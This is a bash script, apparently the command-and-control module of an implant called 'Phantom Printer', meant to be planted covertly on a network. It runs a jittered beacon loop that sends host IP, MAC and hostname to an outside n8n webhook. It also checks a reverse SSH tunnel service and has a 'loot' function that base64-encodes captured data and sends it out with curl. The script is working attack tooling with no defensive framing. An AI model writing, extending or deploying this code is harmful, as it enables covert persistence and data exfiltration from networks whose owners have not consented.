#!/bin/bash
#================================================================
# PHANTOM PRINTER V2 - C2 MODULE
# Multi-channel C2: SSH tunnel, HTTPS beacon, dead drops
#================================================================

set -e

# Source configuration
CONFIG_FILE="/home/kali/dropbox-v2/config/dropbox.conf"
if [[ -f "$CONFIG_FILE" ]]; then
    source "$CONFIG_FILE"
fi

# Defaults
C2_PRIMARY_HOST="${C2_PRIMARY_HOST:-}"
C2_PRIMARY_PORT="${C2_PRIMARY_PORT:-22}"
C2_PRIMARY_USER="${C2_PRIMARY_USER:-dropbox}"
C2_TUNNEL_PORT="${C2_TUNNEL_PORT:-2222}"
N8N_WEBHOOK_URL="${N8N_WEBHOOK_URL:-}"
BEACON_INTERVAL="${BEACON_INTERVAL:-60}"
BEACON_JITTER="${BEACON_JITTER:-30}"
DROPBOX_ID="${DROPBOX_ID:-phantom-001}"

LOG_FILE="/home/kali/dropbox-v2/logs/c2.log"
mkdir -p "$(dirname "$LOG_FILE")"

# Log function
log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] [C2] $1"
    echo "$msg" | tee -a "$LOG_FILE"
    logger -t "dropbox-c2" "$1"
}

# Get system info for heartbeat
get_system_info() {
    local ip_address=$(ip -4 addr show scope global | grep inet | head -1 | awk '{print $2}' | cut -d/ -f1)
    local mac_address=$(ip link show | grep ether | head -1 | awk '{print $2}')
    local hostname=$(hostname)
    local uptime=$(uptime -p 2>/dev/null || uptime | awk -F'up' '{print $2}' | awk -F',' '{print $1}')
    local load=$(cat /proc/loadavg | awk '{print $1}')
    
    cat << EOF
{
    "dropbox_id": "$DROPBOX_ID",
    "ip_address": "$ip_address",
    "mac_address": "$mac_address",
    "hostname": "$hostname",
    "uptime": "$uptime",
    "load": "$load",
    "timestamp": "$(date -Iseconds)"
}
EOF
}

# Send heartbeat to n8n
send_heartbeat() {
    if [[ -z "$N8N_WEBHOOK_URL" ]]; then
        log "No N8N_WEBHOOK_URL configured, skipping heartbeat"
        return 1
    fi
    
    local webhook_url="${N8N_WEBHOOK_URL}/webhook/dropbox-heartbeat"
    local payload=$(get_system_info)
    
    log "Sending heartbeat to n8n..."
    
    local response=$(curl -s -X POST "$webhook_url" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 30 2>/dev/null)
    
    if [[ $? -eq 0 ]]; then
        log "Heartbeat sent successfully"
        return 0
    else
        log "Heartbeat failed"
        return 1
    fi
}

# Send alert to n8n
send_alert() {
    local alert_type="$1"
    local level="$2"
    local message="$3"
    
    if [[ -z "$N8N_WEBHOOK_URL" ]]; then
        return 1
    fi
    
    local webhook_url="${N8N_WEBHOOK_URL}/webhook/dropbox-alert"
    
    local payload=$(cat << EOF
{
    "dropbox_id": "$DROPBOX_ID",
    "type": "$alert_type",
    "level": "$level",
    "message": "$message",
    "timestamp": "$(date -Iseconds)"
}
EOF
)
    
    curl -s -X POST "$webhook_url" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 30 2>/dev/null
    
    log "Alert sent: [$level] $alert_type - $message"
}

# Send loot to n8n
send_loot() {
    local loot_type="$1"
    local source="$2"
    local data="$3"
    
    if [[ -z "$N8N_WEBHOOK_URL" ]]; then
        return 1
    fi
    
    local webhook_url="${N8N_WEBHOOK_URL}/webhook/dropbox-loot"
    
    # Base64 encode if binary
    local encoded_data=$(echo -n "$data" | base64 -w 0)
    
    local payload=$(cat << EOF
{
    "dropbox_id": "$DROPBOX_ID",
    "type": "$loot_type",
    "source": "$source",
    "data": "$data",
    "data_b64": "$encoded_data",
    "timestamp": "$(date -Iseconds)"
}
EOF
)
    
    curl -s -X POST "$webhook_url" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 60 2>/dev/null
    
    log "Loot sent: $loot_type from $source"
}

# Check SSH tunnel status
check_ssh_tunnel() {
    if systemctl is-active --quiet dropbox-ssh-tunnel; then
        log "SSH tunnel: ACTIVE"
        return 0
    else
        log "SSH tunnel: DOWN"
        return 1
    fi
}

# Calculate jitter
get_jitter() {
    local jitter=$((RANDOM % (BEACON_JITTER * 2) - BEACON_JITTER))
    echo $((BEACON_INTERVAL + jitter))
}

# Main beacon loop
beacon_loop() {
    log "=== STARTING C2 BEACON LOOP ==="
    log "Interval: ${BEACON_INTERVAL}s (±${BEACON_JITTER}s jitter)"
    
    # Send initial online alert
    send_alert "online" "info" "Dropbox is now online"
    
    while true; do
        # Send heartbeat
        send_heartbeat
        
        # Check tunnel status
        check_ssh_tunnel
        
        # Calculate next beacon time with jitter
        local sleep_time=$(get_jitter)
        log "Next beacon in ${sleep_time}s"
        sleep "$sleep_time"
    done
}

# Single heartbeat
single_heartbeat() {
    log "Sending single heartbeat..."
    send_heartbeat
}

# Show status
show_status() {
    echo "=== C2 STATUS ==="
    echo "Dropbox ID: $DROPBOX_ID"
    echo "C2 Server: $C2_PRIMARY_HOST:$C2_PRIMARY_PORT"
    echo "n8n URL: $N8N_WEBHOOK_URL"
    echo "Beacon Interval: ${BEACON_INTERVAL}s (±${BEACON_JITTER}s)"
    echo ""
    echo "SSH Tunnel Status:"
    systemctl status dropbox-ssh-tunnel --no-pager 2>/dev/null | head -5 || echo "  Not configured"
}

# Main
case "${1:-}" in
    start|loop)
        beacon_loop
        ;;
    heartbeat|ping)
        single_heartbeat
        ;;
    alert)
        send_alert "${2:-test}" "${3:-info}" "${4:-Test alert}"
        ;;
    loot)
        send_loot "${2:-test}" "${3:-manual}" "${4:-Test data}"
        ;;
    status)
        show_status
        ;;
    *)
        echo "Usage: $0 {start|heartbeat|alert|loot|status}"
        echo ""
        echo "Commands:"
        echo "  start      - Start beacon loop"
        echo "  heartbeat  - Send single heartbeat"
        echo "  alert      - Send alert: $0 alert <type> <level> <message>"
        echo "  loot       - Send loot: $0 loot <type> <source> <data>"
        echo "  status     - Show C2 status"
        exit 1
        ;;
esac

exit 0
